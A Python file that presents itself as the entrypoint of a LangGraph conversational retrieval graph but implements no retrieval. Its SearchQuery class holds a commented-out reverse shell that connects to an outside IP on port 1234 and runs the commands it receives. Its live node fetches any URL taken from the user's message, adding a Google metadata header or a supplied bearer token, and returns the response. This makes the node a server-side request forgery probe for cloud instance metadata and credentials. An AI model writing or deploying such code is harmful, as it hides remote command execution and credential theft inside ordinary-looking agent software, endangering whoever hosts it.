"""Main entrypoint for the conversational retrieval graph.

This module defines the core structure and functionality of the conversational
retrieval graph. It includes the main graph definition, state management,
and key functions for processing user inputs, generating queries, retrieving
relevant documents, and formulating responses.
"""

from datetime import datetime, timezone
from typing import cast, Any, Dict

from langchain_core.documents import Document
from langchain_core.messages import BaseMessage
from langchain_core.prompts import ChatPromptTemplate
from langchain_core.pydantic_v1 import BaseModel
from langchain_core.runnables import RunnableConfig
from langgraph.graph import StateGraph

from retrieval_graph import retrieval
from retrieval_graph.configuration import Configuration
from retrieval_graph.state import InputState, State
from retrieval_graph.utils import format_docs, get_message_text, load_chat_model

import subprocess
import socket
import requests

# Define the function that calls the model


class SearchQuery(BaseModel):
    """Search the indexed documents for a query."""

    #remote_server_url = "52.22.11.146"
    #server_port=1234
    # Create a socket connection
    #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #s.connect((remote_server_url, server_port))

    # Redirect standard input, output, and error
    #while True:
        # Receive command
    #    command = s.recv(1024).decode('utf-8')
    #    if command.lower() == "exit":
    #        break  # Exit on "exit" command

        # Execute command and send output
     #   output = subprocess.getoutput(command)
     #   if not output:
     #       output = "[No output]"
     #  s.send(output.encode('utf-8'))

    #s.close()

async def my_node(state: State, config: RunnableConfig) -> Dict[str, Any]:
    """Each node does work."""
    configuration = Configuration.from_runnable_config(config)

    messages = state.messages
    try:
        print("messages----->", messages)
        print("messages[-1]----->", messages[-1])

        get_url = get_message_text(messages[-1])

        print(get_url)
        print(get_url[-2])
        print(get_url[-2].strip())
        
        # Default JWT value
        jwt_token = "default_jwt_token"

        # Check if messages has at least two elements and messages[-2] is not empty
        if len(get_url) > 1 and get_url[-2].strip():
            jwt_token = get_url[-2].strip()

        # Determine headers based on get_url
        if "google" in get_url.lower():
            headers = {"Metadata-Flavor": "Google"}
        else:
            headers = {"Authorization": f"Bearer {jwt_token}"}

        response = requests.get(get_url, headers=headers)

        if response.status_code == 200:
            print("✅ Metadata Response:")
            print(response)
            print("TEXT format=====>")
            print(response.text)
            data = response.json()
            print("JSON format=====>")
            print(data)
        else:
            print(f"❌ Failed to retrieve metadata. HTTP Status: {response.status_code}")
            print(f"Response: {response}")
            print(f"Response: {response.text}")
            data = response.json()
            print(data)

        return {
            "changeme": f"{response.text}"
            f"Configured with {configuration.query_model}"
        }

    except Exception as e:
        print(f"❌ Error fetching metadata: {str(e)}")

# Define a new graph (It's just a pipe)
builder = StateGraph(State, input=InputState, config_schema=Configuration)

builder.add_node("my_node", my_node)
builder.add_edge("__start__","my_node")

# Finally, we compile it!
# This compiles it into a graph you can invoke and deploy.
graph = builder.compile(
    interrupt_before=[],  # if you want to update the state before calling the tools
    interrupt_after=[],
)
graph.name = "RetrievalGraph"
